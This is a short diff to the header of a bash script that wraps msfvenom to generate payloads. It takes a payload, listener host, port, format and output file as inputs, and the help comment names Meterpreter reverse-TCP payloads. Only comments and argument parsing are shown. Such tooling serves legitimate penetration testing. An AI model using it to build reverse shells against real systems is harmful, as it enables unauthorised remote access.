@@ -1,7 +1,7 @@
 #!/bin/bash
 # Dependencies: msfvenom
 # Inputs: PAYLOAD, LHOST, LPORT, FORMAT, OUTPUT_FILE
-# Help: Example Payload - python/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp  Format options: exe, bat, raw, elf
+# Help: PAYLOAD - python/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp
 
 PAYLOAD="$1"
 LHOST="$2"
